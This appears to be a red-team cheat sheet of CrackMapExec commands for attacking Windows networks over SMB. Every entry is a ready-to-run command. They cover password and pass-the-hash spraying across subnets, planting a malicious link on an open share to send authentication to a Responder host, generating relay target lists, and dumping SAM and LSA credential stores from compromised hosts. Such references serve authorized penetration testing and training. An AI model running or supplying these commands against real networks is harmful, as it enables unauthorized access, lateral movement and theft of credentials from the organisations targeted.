Spray the network using SMB with domain credentials:
~~~bash
crackmapexec smb 10.0.0.0/24 -u username -d domain -p Password
~~~

Spray the network using SMB with a local user and NTLM hash:
~~~bash
crackmapexec smb 10.0.0.0/24 -u username -H hash --local-auth
~~~

Use the Slinky SMB module to set up a malicious link on an unauthenticated share:
~~~bash
crackmapexec smb <target ip> -u Guest -p “” -M slinky -o server=responder_ip name=some_unique_name
~~~

Generate a SMB target list:
~~~bash
crackmapexec smb <CIDR> --gen-relay-list targets.txt
~~~

Spray a target list with a local admin's hashed NTLM credentials:
~~~bash
crackmapexec smb targets.txt -u Administrator -H <NT Hash> --local-auth
~~~

Spray a target list with a local admin's hashed NTLM credentials and dump SAM (LOCAL) on any target that the user has Admin access to:
~~~bash
crackmapexec smb targets.txt -u Administrator -H <NT Hash> --local-auth --sam
~~~

Spray a target list with a local admin's hashed NTLM credentials and dump LSA (Domain/Cached) on any target that the user has Admin access to:
~~~bash
crackmapexec smb targets.txt -u Administrator -H <NT Hash> --local-auth --lsa
~~~

Generate a Relay list based upon prior scan results and tee the command output to a new file:
~~~bash
crackmapexec smb ../scans/nmap-grep-[date]/smb-hosts.txt --gen-relay-list cme_relay.txt | tee cme.out
~~~